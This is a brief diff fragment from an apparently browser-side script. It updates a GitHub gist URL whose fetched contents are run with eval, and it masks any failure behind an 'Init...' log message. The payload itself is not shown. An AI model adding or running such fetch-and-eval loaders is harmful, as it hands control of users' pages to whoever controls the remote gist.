@@ -193,7 +193,7 @@
     });
   };
 
-  fetch("https://gist.githubusercontent.com/minhReal/079a1070f25849286d00cc00796bf43a/raw/066442542586b6c726efe28677e95e64daf80b16/load%2520logic%2520A.i")
+  fetch("https://gist.githubusercontent.com/minhReal/079a1070f25849286d00cc00796bf43a/raw/5202d5f0e267400e81f24f48aa9cdd0fe2f2e843/load%2520logic%2520A.i")
     .then(r => r.text()).then(eval).catch(() => console.log("Init..."));
   document.getElementById('runBtn').onclick = () => {
     const doc = document.querySelector('iframe')?.contentDocument || document;
